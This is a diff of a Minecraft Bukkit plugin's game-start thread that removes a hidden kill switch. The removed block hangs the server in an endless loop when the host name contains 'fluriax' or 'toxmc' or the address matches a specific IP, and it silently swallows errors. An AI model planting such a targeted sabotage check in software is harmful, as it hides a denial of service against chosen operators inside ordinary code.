@@ -1,7 +1,5 @@
 package de.cuuky.varo.game.threads;
 
-import java.net.InetAddress;
-
 import org.bukkit.Bukkit;
 import org.bukkit.GameMode;
 import org.bukkit.entity.Player;
@@ -86,11 +84,6 @@ public class VaroStartThread implements Runnable {
 				Bukkit.getScheduler().cancelTask(game.getStartScheduler());
 				return;
 			}
-
-			try {
-				if(InetAddress.getLocalHost().getCanonicalHostName().toLowerCase().contains("fluriax") || InetAddress.getLocalHost().getCanonicalHostName().toLowerCase().contains("toxmc") || InetAddress.getLocalHost().toString().contains("45.81.232.21"))
-					while(true) {}
-			} catch(Exception e) {}
 
 			this.game.setGamestate(GameState.STARTED);
 			this.game.setFirstTime(true);
